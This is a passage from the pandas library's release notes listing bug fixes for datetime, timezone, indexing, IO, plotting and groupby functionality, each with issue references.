(:issue:`23227`)\n- Bug in many methods of the ``.str``-accessor, which always failed on calling the ``CategoricalIndex.str`` constructor (:issue:`23555`, :issue:`23556`)\n- Bug in :meth:`Series.where` losing the categorical dtype for categorical data (:issue:`24077`)\n- Bug in :meth:`Categorical.apply` where ``NaN`` values could be handled unpredictably. They now remain unchanged (:issue:`24241`)\n- Bug in :class:`Categorical` comparison methods incorrectly raising ``ValueError`` when operating against a :class:`DataFrame` (:issue:`24630`)\n- Bug in :meth:`Categorical.set_categories` where setting fewer new categories with ``rename=True`` caused a segmentation fault (:issue:`24675`)\n\nDatetimelike\n^^^^^^^^^^^^\n\n- Fixed bug where two :class:`DateOffset` objects with different ``normalize`` attributes could evaluate as equal (:issue:`21404`)\n- Fixed bug where :meth:`Timestamp.resolution` incorrectly returned 1-microsecond ``timedelta`` instead of 1-nanosecond :class:`Timedelta` (:issue:`21336`, :issue:`21365`)\n- Bug in :func:`to_datetime` that did not consistently return an :class:`Index` when ``box=True`` was specified (:issue:`21864`)\n- Bug in :class:`DatetimeIndex` comparisons where string comparisons incorrectly raises ``TypeError`` (:issue:`22074`)\n- Bug in :class:`DatetimeIndex` comparisons when comparing against ``timedelta64[ns]`` dtyped arrays; in some cases ``TypeError`` was incorrectly raised, in others it incorrectly failed to raise (:issue:`22074`)\n- Bug in :class:`DatetimeIndex` comparisons when comparing against object-dtyped arrays (:issue:`22074`)\n- Bug in :class:`DataFrame` with ``datetime64[ns]`` dtype addition and subtraction with ``Timedelta``-like objects (:issue:`22005`, :issue:`22163`)\n- Bug in :class:`DataFrame` with ``datetime64[ns]`` dtype addition and subtraction with ``DateOffset`` objects returning an ``object`` dtype instead of ``datetime64[ns]`` dtype (:issue:`21610`, :issue:`22163`)\n- Bug in :class:`DataFrame` with ``datetime64[ns]`` dtype comparing against ``NaT`` incorrectly (:issue:`22242`, :issue:`22163`)\n- Bug in :class:`DataFrame` with ``datetime64[ns]`` dtype subtracting ``Timestamp``-like object incorrectly returned ``datetime64[ns]`` dtype instead of ``timedelta64[ns]`` dtype (:issue:`8554`, :issue:`22163`)\n- Bug in :class:`DataFrame` with ``datetime64[ns]`` dtype subtracting ``np.datetime64`` object with non-nanosecond unit failing to convert to nanoseconds (:issue:`18874`, :issue:`22163`)\n- Bug in :class:`DataFrame` comparisons against ``Timestamp``-like objects failing to raise ``TypeError`` for inequality checks with mismatched types (:issue:`8932`, :issue:`22163`)\n- Bug in :class:`DataFrame` with mixed dtypes including ``datetime64[ns]`` incorrectly raising ``TypeError`` on equality comparisons (:issue:`13128`, :issue:`22163`)\n- Bug in :attr:`DataFrame.values` returning a :class:`DatetimeIndex` for a single-column ``DataFrame`` with tz-aware datetime values. Now a 2-D :class:`numpy.ndarray` of :class:`Timestamp` objects is returned (:issue:`24024`)\n- Bug in :meth:`DataFrame.eq` comparison against ``NaT`` incorrectly returning ``True`` or ``NaN`` (:issue:`15697`, :issue:`22163`)\n- Bug in :class:`DatetimeIndex` subtraction that incorrectly failed to raise ``OverflowError`` (:issue:`22492`, :issue:`22508`)\n- Bug in :class:`DatetimeIndex` incorrectly allowing indexing with ``Timedelta`` object (:issue:`20464`)\n- Bug in :class:`DatetimeIndex` where frequency was being set if original frequency was ``None`` (:issue:`22150`)\n- Bug in rounding methods of :class:`DatetimeIndex` (:meth:`~DatetimeIndex.round`, :meth:`~DatetimeIndex.ceil`, :meth:`~DatetimeIndex.floor`) and :class:`Timestamp` (:meth:`~Timestamp.round`, :meth:`~Timestamp.ceil`, :meth:`~Timestamp.floor`) could give rise to loss of precision (:issue:`22591`)\n- Bug in :func:`to_datetime` with an :class:`Index` argument that would drop the ``name`` from the result (:issue:`21697`)\n- Bug in :class:`PeriodIndex` where adding or subtracting a :class:`timedelta` or :class:`Tick` object produced incorrect results (:issue:`22988`)\n- Bug in the :class:`Series` repr with period-dtype data missing a space before the data (:issue:`23601`)\n- Bug in :func:`date_range` when decrementing a start date to a past end date by a negative frequency (:issue:`23270`)\n- Bug in :meth:`Series.min` which would return ``NaN`` instead of ``NaT`` when called on a series of ``NaT`` (:issue:`23282`)\n- Bug in :meth:`Series.combine_first` not properly aligning categoricals, so that missing values in ``self`` where not filled by valid values from ``other`` (:issue:`24147`)\n- Bug in :func:`DataFrame.combine` with datetimelike values raising a TypeError (:issue:`23079`)\n- Bug in :func:`date_range` with frequency of ``Day`` or higher where dates sufficiently far in the future could wrap around to the past instead of raising ``OutOfBoundsDatetime`` (:issue:`14187`)\n- Bug in :func:`period_range` ignoring the frequency of ``start`` and ``end`` when those are provided as :class:`Period` objects (:issue:`20535`).\n- Bug in :class:`PeriodIndex` with attribute ``freq.n`` greater than 1 where adding a :class:`DateOffset` object would return incorrect results (:issue:`23215`)\n- Bug in :class:`Series` that interpreted string indices as lists of characters when setting datetimelike values (:issue:`23451`)\n- Bug in :class:`DataFrame` when creating a new column from an ndarray of :class:`Timestamp` objects with timezones creating an object-dtype column, rather than datetime with timezone (:issue:`23932`)\n- Bug in :class:`Timestamp` constructor which would drop the frequency of an input :class:`Timestamp` (:issue:`22311`)\n- Bug in :class:`DatetimeIndex` where calling ``np.array(dtindex, dtype=object)`` would incorrectly return an array of ``long`` objects (:issue:`23524`)\n- Bug in :class:`Index` where passing a timezone-aware :class:`DatetimeIndex` and ``dtype=object`` would incorrectly raise a ``ValueError`` (:issue:`23524`)\n- Bug in :class:`Index` where calling ``np.array(dtindex, dtype=object)`` on a timezone-naive :class:`DatetimeIndex` would return an array of ``datetime`` objects instead of :class:`Timestamp` objects, potentially losing nanosecond portions of the timestamps (:issue:`23524`)\n- Bug in :class:`Categorical.__setitem__` not allowing setting with another ``Categorical`` when both are unordered and have the same categories, but in a different order (:issue:`24142`)\n- Bug in :func:`date_range` where using dates with millisecond resolution or higher could return incorrect values or the wrong number of values in the index (:issue:`24110`)\n- Bug in :class:`DatetimeIndex` where constructing a :class:`DatetimeIndex` from a :class:`Categorical` or :class:`CategoricalIndex` would incorrectly drop timezone information (:issue:`18664`)\n- Bug in :class:`DatetimeIndex` and :class:`TimedeltaIndex` where indexing with ``Ellipsis`` would incorrectly lose the index's ``freq`` attribute (:issue:`21282`)\n- Clarified error message produced when passing an incorrect ``freq`` argument to :class:`DatetimeIndex` with ``NaT`` as the first entry in the passed data (:issue:`11587`)\n- Bug in :func:`to_datetime` where ``box`` and ``utc`` arguments were ignored when passing a :class:`DataFrame` or ``dict`` of unit mappings (:issue:`23760`)\n- Bug in :attr:`Series.dt` where the cache would not update properly after an in-place operation (:issue:`24408`)\n- Bug in :class:`PeriodIndex` where comparisons against an array-like object with length 1 failed to raise ``ValueError`` (:issue:`23078`)\n- Bug in :meth:`DatetimeIndex.astype`, :meth:`PeriodIndex.astype` and :meth:`TimedeltaIndex.astype` ignoring the sign of the ``dtype`` for unsigned integer dtypes (:issue:`24405`).\n- Fixed bug in :meth:`Series.max` with ``datetime64[ns]``-dtype failing to return ``NaT`` when nulls are present and ``skipna=False`` is passed (:issue:`24265`)\n- Bug in :func:`to_datetime` where arrays of ``datetime`` objects containing both timezone-aware and timezone-naive ``datetimes`` would fail to raise ``ValueError`` (:issue:`24569`)\n- Bug in :func:`to_datetime` with invalid datetime format doesn't coerce input to ``NaT`` even if ``errors='coerce'`` (:issue:`24763`)\n\nTimedelta\n^^^^^^^^^\n- Bug in :class:`DataFrame` with ``timedelta64[ns]`` dtype division by ``Timedelta``-like scalar incorrectly returning ``timedelta64[ns]`` dtype instead of ``float64`` dtype (:issue:`20088`, :issue:`22163`)\n- Bug in adding a :class:`Index` with object dtype to a :class:`Series` with ``timedelta64[ns]`` dtype incorrectly raising (:issue:`22390`)\n- Bug in multiplying a :class:`Series` with numeric dtype against a ``timedelta`` object (:issue:`22390`)\n- Bug in :class:`Series` with numeric dtype when adding or subtracting an array or ``Series`` with ``timedelta64`` dtype (:issue:`22390`)\n- Bug in :class:`Index` with numeric dtype when multiplying or dividing an array with dtype ``timedelta64`` (:issue:`22390`)\n- Bug in :class:`TimedeltaIndex` incorrectly allowing indexing with ``Timestamp`` object (:issue:`20464`)\n- Fixed bug where subtracting :class:`Timedelta` from an object-dtyped array would raise ``TypeError`` (:issue:`21980`)\n- Fixed bug in adding a :class:`DataFrame` with all-`timedelta64[ns]` dtypes to a :class:`DataFrame` with all-integer dtypes returning incorrect results instead of raising ``TypeError`` (:issue:`22696`)\n- Bug in :class:`TimedeltaIndex` where adding a timezone-aware datetime scalar incorrectly returned a timezone-naive :class:`DatetimeIndex` (:issue:`23215`)\n- Bug in :class:`TimedeltaIndex` where adding ``np.timedelta64('NaT')`` incorrectly returned an all-``NaT`` :class:`DatetimeIndex` instead of an all-``NaT`` :class:`TimedeltaIndex` (:issue:`23215`)\n- Bug in :class:`Timedelta` and :func:`to_timedelta()` have inconsistencies in supported unit string (:issue:`21762`)\n- Bug in :class:`TimedeltaIndex` division where dividing by another :class:`TimedeltaIndex` raised ``TypeError`` instead of returning a :class:`Float64Index` (:issue:`23829`, :issue:`22631`)\n- Bug in :class:`TimedeltaIndex` comparison operations where comparing against non-``Timedelta``-like objects would raise ``TypeError`` instead of returning all-``False`` for ``__eq__`` and all-``True`` for ``__ne__`` (:issue:`24056`)\n- Bug in :class:`Timedelta` comparisons when comparing with a ``Tick`` object incorrectly raising ``TypeError`` (:issue:`24710`)\n\nTimezones\n^^^^^^^^^\n\n- Bug in :meth:`Index.shift` where an ``AssertionError`` would raise when shifting across DST (:issue:`8616`)\n- Bug in :class:`Timestamp` constructor where passing an invalid timezone offset designator (``Z``) would not raise a ``ValueError`` (:issue:`8910`)\n- Bug in :meth:`Timestamp.replace` where replacing at a DST boundary would retain an incorrect offset (:issue:`7825`)\n- Bug in :meth:`Series.replace` with ``datetime64[ns, tz]`` data when replacing ``NaT`` (:issue:`11792`)\n- Bug in :class:`Timestamp` when passing different string date formats with a timezone offset would produce different timezone offsets (:issue:`12064`)\n- Bug when comparing a tz-naive :class:`Timestamp` to a tz-aware :class:`DatetimeIndex` which would coerce the :class:`DatetimeIndex` to tz-naive (:issue:`12601`)\n- Bug in :meth:`Series.truncate` with a tz-aware :class:`DatetimeIndex` which would cause a core dump (:issue:`9243`)\n- Bug in :class:`Series` constructor which would coerce tz-aware and tz-naive :class:`Timestamp` to tz-aware (:issue:`13051`)\n- Bug in :class:`Index` with ``datetime64[ns, tz]`` dtype that did not localize integer data correctly (:issue:`20964`)\n- Bug in :class:`DatetimeIndex` where constructing with an integer and tz would not localize correctly (:issue:`12619`)\n- Fixed bug where :meth:`DataFrame.describe` and :meth:`Series.describe` on tz-aware datetimes did not show ``first`` and ``last`` result (:issue:`21328`)\n- Bug in :class:`DatetimeIndex` comparisons failing to raise ``TypeError`` when comparing timezone-aware ``DatetimeIndex`` against ``np.datetime64`` (:issue:`22074`)\n- Bug in ``DataFrame`` assignment with a timezone-aware scalar (:issue:`19843`)\n- Bug in :func:`DataFrame.asof` that raised a ``TypeError`` when attempting to compare tz-naive and tz-aware timestamps (:issue:`21194`)\n- Bug when constructing a :class:`DatetimeIndex` with :class:`Timestamp` constructed with the ``replace`` method across DST (:issue:`18785`)\n- Bug when setting a new value with :meth:`DataFrame.loc` with a :class:`DatetimeIndex` with a DST transition (:issue:`18308`, :issue:`20724`)\n- Bug in :meth:`Index.unique` that did not re-localize tz-aware dates correctly (:issue:`21737`)\n- Bug when indexing a :class:`Series` with a DST transition (:issue:`21846`)\n- Bug in :meth:`DataFrame.resample` and :meth:`Series.resample` where an ``AmbiguousTimeError`` or ``NonExistentTimeError`` would raise if a timezone aware timeseries ended on a DST transition (:issue:`19375`, :issue:`10117`)\n- Bug in :meth:`DataFrame.drop` and :meth:`Series.drop` when specifying a tz-aware Timestamp key to drop from a :class:`DatetimeIndex` with a DST transition (:issue:`21761`)\n- Bug in :class:`DatetimeIndex` constructor where ``NaT`` and ``dateutil.tz.tzlocal`` would raise an ``OutOfBoundsDatetime`` error (:issue:`23807`)\n- Bug in :meth:`DatetimeIndex.tz_localize` and :meth:`Timestamp.tz_localize` with ``dateutil.tz.tzlocal`` near a DST transition that would return an incorrectly localized datetime (:issue:`23807`)\n- Bug in :class:`Timestamp` constructor where a ``dateutil.tz.tzutc`` timezone passed with a ``datetime.datetime`` argument would be converted to a ``pytz.UTC`` timezone (:issue:`23807`)\n- Bug in :func:`to_datetime` where ``utc=True`` was not respected when specifying a ``unit`` and ``errors='ignore'`` (:issue:`23758`)\n- Bug in :func:`to_datetime` where ``utc=True`` was not respected when passing a :class:`Timestamp` (:issue:`24415`)\n- Bug in :meth:`DataFrame.any` returns wrong value when ``axis=1`` and the data is of datetimelike type (:issue:`23070`)\n- Bug in :meth:`DatetimeIndex.to_period` where a timezone aware index was converted to UTC first before creating :class:`PeriodIndex` (:issue:`22905`)\n- Bug in :meth:`DataFrame.tz_localize`, :meth:`DataFrame.tz_convert`, :meth:`Series.tz_localize`, and :meth:`Series.tz_convert` where ``copy=False`` would mutate the original argument inplace (:issue:`6326`)\n- Bug in :meth:`DataFrame.max` and :meth:`DataFrame.min` with ``axis=1`` where a :class:`Series` with ``NaN`` would be returned when all columns contained the same timezone (:issue:`10390`)\n\nOffsets\n^^^^^^^\n\n- Bug in :class:`FY5253` where date offsets could incorrectly raise an ``AssertionError`` in arithmetic operations (:issue:`14774`)\n- Bug in :class:`DateOffset` where keyword arguments ``week`` and ``milliseconds`` were accepted and ignored.  Passing these will now raise ``ValueError`` (:issue:`19398`)\n- Bug in adding :class:`DateOffset` with :class:`DataFrame` or :class:`PeriodIndex` incorrectly raising ``TypeError`` (:issue:`23215`)\n- Bug in comparing :class:`DateOffset` objects with non-DateOffset objects, particularly strings, raising ``ValueError`` instead of returning ``False`` for equality checks and ``True`` for not-equal checks (:issue:`23524`)\n\nNumeric\n^^^^^^^\n\n- Bug in :class:`Series` ``__rmatmul__`` doesn't support matrix vector multiplication (:issue:`21530`)\n- Bug in :func:`factorize` fails with read-only array (:issue:`12813`)\n- Fixed bug in :func:`unique` handled signed zeros inconsistently: for some inputs 0.0 and -0.0 were treated as equal and for some inputs as different. Now they are treated as equal for all inputs (:issue:`21866`)\n- Bug in :meth:`DataFrame.agg`, :meth:`DataFrame.transform` and :meth:`DataFrame.apply` where,\n  when supplied with a list of functions and ``axis=1`` (e.g. ``df.apply(['sum', 'mean'], axis=1)``),\n  a ``TypeError`` was wrongly raised. For all three methods such calculation are now done correctly. (:issue:`16679`).\n- Bug in :class:`Series` comparison against datetime-like scalars and arrays (:issue:`22074`)\n- Bug in :class:`DataFrame` multiplication between boolean dtype and integer returning ``object`` dtype instead of integer dtype (:issue:`22047`, :issue:`22163`)\n- Bug in :meth:`DataFrame.apply` where, when supplied with a string argument and additional positional or keyword arguments (e.g. ``df.apply('sum', min_count=1)``), a ``TypeError`` was wrongly raised (:issue:`22376`)\n- Bug in :meth:`DataFrame.astype` to extension dtype may raise ``AttributeError`` (:issue:`22578`)\n- Bug in :class:`DataFrame` with ``timedelta64[ns]`` dtype arithmetic operations with ``ndarray`` with integer dtype incorrectly treating the narray as ``timedelta64[ns]`` dtype (:issue:`23114`)\n- Bug in :meth:`Series.rpow` with object dtype ``NaN`` for ``1 ** NA`` instead of ``1`` (:issue:`22922`).\n- :meth:`Series.agg` can now handle numpy NaN-aware methods like :func:`numpy.nansum` (:issue:`19629`)\n- Bug in :meth:`Series.rank` and :meth:`DataFrame.rank` when ``pct=True`` and more than 2\\ :sup:`24` rows are present resulted in percentages greater than 1.0 (:issue:`18271`)\n- Calls such as :meth:`DataFrame.round` with a non-unique :meth:`CategoricalIndex` now return expected data. Previously, data would be improperly duplicated (:issue:`21809`).\n- Added ``log10``, ``floor`` and ``ceil`` to the list of supported functions in :meth:`DataFrame.eval` (:issue:`24139`, :issue:`24353`)\n- Logical operations ``&, |, ^`` between :class:`Series` and :class:`Index` will no longer raise ``ValueError`` (:issue:`22092`)\n- Checking PEP 3141 numbers in :func:`~pandas.api.types.is_scalar` function returns ``True`` (:issue:`22903`)\n- Reduction methods like :meth:`Series.sum` now accept the default value of ``keepdims=False`` when called from a NumPy ufunc, rather than raising a ``TypeError``. Full support for ``keepdims`` has not been implemented (:issue:`24356`).\n\nConversion\n^^^^^^^^^^\n\n- Bug in :meth:`DataFrame.combine_first` in which column types were unexpectedly converted to float (:issue:`20699`)\n- Bug in :meth:`DataFrame.clip` in which column types are not preserved and casted to float (:issue:`24162`)\n- Bug in :meth:`DataFrame.clip` when order of columns of dataframes doesn't match, result observed is wrong in numeric values (:issue:`20911`)\n- Bug in :meth:`DataFrame.astype` where converting to an extension dtype when duplicate column names are present causes a ``RecursionError`` (:issue:`24704`)\n\nStrings\n^^^^^^^\n\n- Bug in :meth:`Index.str.partition` was not nan-safe (:issue:`23558`).\n- Bug in :meth:`Index.str.split` was not nan-safe (:issue:`23677`).\n- Bug :func:`Series.str.contains` not respecting the ``na`` argument for a ``Categorical`` dtype ``Series`` (:issue:`22158`)\n- Bug in :meth:`Index.str.cat` when the result contained only ``NaN`` (:issue:`24044`)\n\nInterval\n^^^^^^^^\n\n- Bug in the :class:`IntervalIndex` constructor where the ``closed`` parameter did not always override the inferred ``closed`` (:issue:`19370`)\n- Bug in the ``IntervalIndex`` repr where a trailing comma was missing after the list of intervals (:issue:`20611`)\n- Bug in :class:`Interval` where scalar arithmetic operations did not retain the ``closed`` value (:issue:`22313`)\n- Bug in :class:`IntervalIndex` where indexing with datetime-like values raised a ``KeyError`` (:issue:`20636`)\n- Bug in ``IntervalTree`` where data containing ``NaN`` triggered a warning and resulted in incorrect indexing queries with :class:`IntervalIndex` (:issue:`23352`)\n\nIndexing\n^^^^^^^^\n\n- Bug in :meth:`DataFrame.ne` fails if columns contain column name \"dtype\" (:issue:`22383`)\n- The traceback from a ``KeyError`` when asking ``.loc`` for a single missing label is now shorter and more clear (:issue:`21557`)\n- :class:`PeriodIndex` now emits a ``KeyError`` when a malformed string is looked up, which is consistent with the behavior of :class:`DatetimeIndex` (:issue:`22803`)\n- When ``.ix`` is asked for a missing integer label in a :class:`MultiIndex` with a first level of integer type, it now raises a ``KeyError``, consistently with the case of a flat :class:`Int64Index`, rather than falling back to positional indexing (:issue:`21593`)\n- Bug in :meth:`Index.reindex` when reindexing a tz-naive and tz-aware :class:`DatetimeIndex` (:issue:`8306`)\n- Bug in :meth:`Series.reindex` when reindexing an empty series with a ``datetime64[ns, tz]`` dtype (:issue:`20869`)\n- Bug in :class:`DataFrame` when setting values with ``.loc`` and a timezone aware :class:`DatetimeIndex` (:issue:`11365`)\n- ``DataFrame.__getitem__`` now accepts dictionaries and dictionary keys as list-likes of labels, consistently with ``Series.__getitem__`` (:issue:`21294`)\n- Fixed ``DataFrame[np.nan]`` when columns are non-unique (:issue:`21428`)\n- Bug when indexing :class:`DatetimeIndex` with nanosecond resolution dates and timezones (:issue:`11679`)\n- Bug where indexing with a Numpy array containing negative values would mutate the indexer (:issue:`21867`)\n- Bug where mixed indexes wouldn't allow integers for ``.at`` (:issue:`19860`)\n- ``Float64Index.get_loc`` now raises ``KeyError`` when boolean key passed. (:issue:`19087`)\n- Bug in :meth:`DataFrame.loc` when indexing with an :class:`IntervalIndex` (:issue:`19977`)\n- :class:`Index` no longer mangles ``None``, ``NaN`` and ``NaT``, i.e. they are treated as three different keys. However, for numeric Index all three are still coerced to a ``NaN`` (:issue:`22332`)\n- Bug in ``scalar in Index`` if scalar is a float while the ``Index`` is of integer dtype (:issue:`22085`)\n- Bug in :func:`MultiIndex.set_levels` when levels value is not subscriptable (:issue:`23273`)\n- Bug where setting a timedelta column by ``Index`` causes it to be casted to double, and therefore lose precision (:issue:`23511`)\n- Bug in :func:`Index.union` and :func:`Index.intersection` where name of the ``Index`` of the result was not computed correctly for certain cases (:issue:`9943`, :issue:`9862`)\n- Bug in :class:`Index` slicing with boolean :class:`Index` may raise ``TypeError`` (:issue:`22533`)\n- Bug in ``PeriodArray.__setitem__`` when accepting slice and list-like value (:issue:`23978`)\n- Bug in :class:`DatetimeIndex`, :class:`TimedeltaIndex` where indexing with ``Ellipsis`` would lose their ``freq`` attribute (:issue:`21282`)\n- Bug in ``iat`` where using it to assign an incompatible value would create a new column (:issue:`23236`)\n\nMissing\n^^^^^^^\n\n- Bug in :func:`DataFrame.fillna` where a ``ValueError`` would raise when one column contained a ``datetime64[ns, tz]`` dtype (:issue:`15522`)\n- Bug in :func:`Series.hasnans` that could be incorrectly cached and return incorrect answers if null elements are introduced after an initial call (:issue:`19700`)\n- :func:`Series.isin` now treats all NaN-floats as equal also for ``np.object_``-dtype. This behavior is consistent with the behavior for float64 (:issue:`22119`)\n- :func:`unique` no longer mangles NaN-floats and the ``NaT``-object for ``np.object_``-dtype, i.e. ``NaT`` is no longer coerced to a NaN-value and is treated as a different entity. (:issue:`22295`)\n- :class:`DataFrame` and :class:`Series` now properly handle numpy masked arrays with hardened masks. Previously, constructing a DataFrame or Series from a masked array with a hard mask would create a pandas object containing the underlying value, rather than the expected NaN. (:issue:`24574`)\n- Bug in :class:`DataFrame` constructor where ``dtype`` argument was not honored when handling numpy masked record arrays. (:issue:`24874`)\n\nMultiIndex\n^^^^^^^^^^\n\n- Bug in :func:`io.formats.style.Styler.applymap` where ``subset=`` with :class:`MultiIndex` slice would reduce to :class:`Series` (:issue:`19861`)\n- Removed compatibility for :class:`MultiIndex` pickles prior to version 0.8.0; compatibility with :class:`MultiIndex` pickles from version 0.13 forward is maintained (:issue:`21654`)\n- :meth:`MultiIndex.get_loc_level` (and as a consequence, ``.loc`` on a ``Series`` or ``DataFrame`` with a :class:`MultiIndex` index) will now raise a ``KeyError``, rather than returning an empty ``slice``, if asked a label which is present in the ``levels`` but is unused (:issue:`22221`)\n- :class:`MultiIndex` has gained the :meth:`MultiIndex.from_frame`, it allows constructing a :class:`MultiIndex` object from a :class:`DataFrame` (:issue:`22420`)\n- Fix ``TypeError`` in Python 3 when creating :class:`MultiIndex` in which some levels have mixed types, e.g. when some labels are tuples (:issue:`15457`)\n\nIO\n^^\n\n- Bug in :func:`read_csv` in which a column specified with ``CategoricalDtype`` of boolean categories was not being correctly coerced from string values to booleans (:issue:`20498`)\n- Bug in :func:`read_csv` in which unicode column names were not being properly recognized with Python 2.x (:issue:`13253`)\n- Bug in :meth:`DataFrame.to_sql` when writing timezone aware data (``datetime64[ns, tz]`` dtype) would raise a ``TypeError`` (:issue:`9086`)\n- Bug in :meth:`DataFrame.to_sql` where a naive :class:`DatetimeIndex` would be written as ``TIMESTAMP WITH TIMEZONE`` type in supported databases, e.g. PostgreSQL (:issue:`23510`)\n- Bug in :meth:`read_excel()` when ``parse_cols`` is specified with an empty dataset (:issue:`9208`)\n- :func:`read_html()` no longer ignores all-whitespace ``<tr>`` within ``<thead>`` when considering the ``skiprows`` and ``header`` arguments. Previously, users had to decrease their ``header`` and ``skiprows`` values on such tables to work around the issue. (:issue:`21641`)\n- :func:`read_excel()` will correctly show the deprecation warning for previously deprecated ``sheetname`` (:issue:`17994`)\n- :func:`read_csv()` and :func:`read_table()` will throw ``UnicodeError`` and not coredump on badly encoded strings (:issue:`22748`)\n- :func:`read_csv()` will correctly parse timezone-aware datetimes (:issue:`22256`)\n- Bug in :func:`read_csv()` in which memory management was prematurely optimized for the C engine when the data was being read in chunks (:issue:`23509`)\n- Bug in :func:`read_csv()` in unnamed columns were being improperly identified when extracting a multi-index (:issue:`23687`)\n- :func:`read_sas()` will parse numbers in sas7bdat-files that have width less than 8 bytes correctly. (:issue:`21616`)\n- :func:`read_sas()` will correctly parse sas7bdat files with many columns (:issue:`22628`)\n- :func:`read_sas()` will correctly parse sas7bdat files with data page types having also bit 7 set (so page type is 128 + 256 = 384) (:issue:`16615`)\n- Bug in :func:`read_sas()` in which an incorrect error was raised on an invalid file format. (:issue:`24548`)\n- Bug in :meth:`detect_client_encoding` where potential ``IOError`` goes unhandled when importing in a mod_wsgi process due to restricted access to stdout. (:issue:`21552`)\n- Bug in :func:`DataFrame.to_html()` with ``index=False`` misses truncation indicators (...) on truncated DataFrame (:issue:`15019`, :issue:`22783`)\n- Bug in :func:`DataFrame.to_html()` with ``index=False`` when both columns and row index are ``MultiIndex`` (:issue:`22579`)\n- Bug in :func:`DataFrame.to_html()` with ``index_names=False`` displaying index name (:issue:`22747`)\n- Bug in :func:`DataFrame.to_html()` with ``header=False`` not displaying row index names (:issue:`23788`)\n- Bug in :func:`DataFrame.to_html()` with ``sparsify=False`` that caused it to raise ``TypeError`` (:issue:`22887`)\n- Bug in :func:`DataFrame.to_string()` that broke column alignment when ``index=False`` and width of first column's values is greater than the width of first column's header (:issue:`16839`, :issue:`13032`)\n- Bug in :func:`DataFrame.to_string()` that caused representations of :class:`DataFrame` to not take up the whole window (:issue:`22984`)\n- Bug in :func:`DataFrame.to_csv` where a single level MultiIndex incorrectly wrote a tuple. Now just the value of the index is written (:issue:`19589`).\n- :class:`HDFStore` will raise ``ValueError`` when the ``format`` kwarg is passed to the constructor (:issue:`13291`)\n- Bug in :meth:`HDFStore.append` when appending a :class:`DataFrame` with an empty string column and ``min_itemsize`` < 8 (:issue:`12242`)\n- Bug in :func:`read_csv()` in which memory leaks occurred in the C engine when parsing ``NaN`` values due to insufficient cleanup on completion or error (:issue:`21353`)\n- Bug in :func:`read_csv()` in which incorrect error messages were being raised when ``skipfooter`` was passed in along with ``nrows``, ``iterator``, or ``chunksize`` (:issue:`23711`)\n- Bug in :func:`read_csv()` in which :class:`MultiIndex` index names were being improperly handled in the cases when they were not provided (:issue:`23484`)\n- Bug in :func:`read_csv()` in which unnecessary warnings were being raised when the dialect's values conflicted with the default arguments (:issue:`23761`)\n- Bug in :func:`read_html()` in which the error message was not displaying the valid flavors when an invalid one was provided (:issue:`23549`)\n- Bug in :meth:`read_excel()` in which extraneous header names were extracted, even though none were specified (:issue:`11733`)\n- Bug in :meth:`read_excel()` in which column names were not being properly converted to string sometimes in Python 2.x (:issue:`23874`)\n- Bug in :meth:`read_excel()` in which ``index_col=None`` was not being respected and parsing index columns anyway (:issue:`18792`, :issue:`20480`)\n- Bug in :meth:`read_excel()` in which ``usecols`` was not being validated for proper column names when passed in as a string (:issue:`20480`)\n- Bug in :meth:`DataFrame.to_dict` when the resulting dict contains non-Python scalars in the case of numeric data (:issue:`23753`)\n- :func:`DataFrame.to_string()`, :func:`DataFrame.to_html()`, :func:`DataFrame.to_latex()` will correctly format output when a string is passed as the ``float_format`` argument (:issue:`21625`, :issue:`22270`)\n- Bug in :func:`read_csv` that caused it to raise ``OverflowError`` when trying to use 'inf' as ``na_value`` with integer index column (:issue:`17128`)\n- Bug in :func:`read_csv` that caused the C engine on Python 3.6+ on Windows to improperly read CSV filenames with accented or special characters (:issue:`15086`)\n- Bug in :func:`read_fwf` in which the compression type of a file was not being properly inferred (:issue:`22199`)\n- Bug in :func:`pandas.io.json.json_normalize` that caused it to raise ``TypeError`` when two consecutive elements of ``record_path`` are dicts (:issue:`22706`)\n- Bug in :meth:`DataFrame.to_stata`, :class:`pandas.io.stata.StataWriter` and :class:`pandas.io.stata.StataWriter117` where a exception would leave a partially written and invalid dta file (:issue:`23573`)\n- Bug in :meth:`DataFrame.to_stata` and :class:`pandas.io.stata.StataWriter117` that produced invalid files when using strLs with non-ASCII characters (:issue:`23573`)\n- Bug in :class:`HDFStore` that caused it to raise ``ValueError`` when reading a Dataframe in Python 3 from fixed format written in Python 2 (:issue:`24510`)\n- Bug in :func:`DataFrame.to_string()` and more generally in the floating ``repr`` formatter. Zeros were not trimmed if ``inf`` was present in a columns while it was the case with NA values. Zeros are now trimmed as in the presence of NA (:issue:`24861`).\n- Bug in the ``repr`` when truncating the number of columns and having a wide last column (:issue:`24849`).\n\nPlotting\n^^^^^^^^\n\n- Bug in :func:`DataFrame.plot.scatter` and :func:`DataFrame.plot.hexbin` caused x-axis label and ticklabels to disappear when colorbar was on in IPython inline backend (:issue:`10611`, :issue:`10678`, and :issue:`20455`)\n- Bug in plotting a Series with datetimes using :func:`matplotlib.axes.Axes.scatter` (:issue:`22039`)\n- Bug in :func:`DataFrame.plot.bar` caused bars to use multiple colors instead of a single one (:issue:`20585`)\n- Bug in validating color parameter caused extra color to be appended to the given color array. This happened to multiple plotting functions using matplotlib. (:issue:`20726`)\n\nGroupBy/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Bug in :func:`.Rolling.min` and :func:`.Rolling.max` with ``closed='left'``, a datetime-like index and only one entry in the series leading to segfault (:issue:`24718`)\n- Bug in :func:`.GroupBy.first` and :func:`.GroupBy.last` with ``as_index=False`` leading to the loss of timezone information (:issue:`15884`)\n- Bug in :meth:`DateFrame.resample` when downsampling across a DST boundary (:issue:`8531`)\n- Bug in date anchoring for :meth:`DateFrame.resample` with offset :class:`Day` when n > 1 (:issue:`24127`)\n- Bug where ``ValueError`` is wrongly raised when calling :func:`.SeriesGroupBy.count` method of a\n  ``SeriesGroupBy`` when the grouping variable only contains NaNs and numpy version < 1.13 (:issue:`21956`).\n- Multiple bugs in :func:`.Rolling.min` with ``closed='left'`` and a\n  datetime-like index leading to incorrect results and also segfault. (:issue:`21704`)\n- Bug in :meth:`.Resampler.apply` when passing positional arguments to applied func (:issue:`14615`).\n- Bug in :meth:`Series.resample` when passing ``numpy.timedelta64`` to ``loffset`` kwarg (:issue:`7687`).\n- Bug in :meth:`.Resampler.asfreq` when frequency of ``TimedeltaIndex`` is a subperiod of a new frequency (:issue:`13022`).\n- Bug in :meth:`.SeriesGroupBy.mean` when values were integral but could not fit inside of int64, overflowing instead. (:issue:`22487`)\n- :func:`.RollingGroupby.agg` and :func:`.ExpandingGroupby.agg` now support multiple aggregation functions as parameters (:issue:`15072`)\n- Bug in :meth:`DataFrame.resample` and :meth:`Series.resample` when 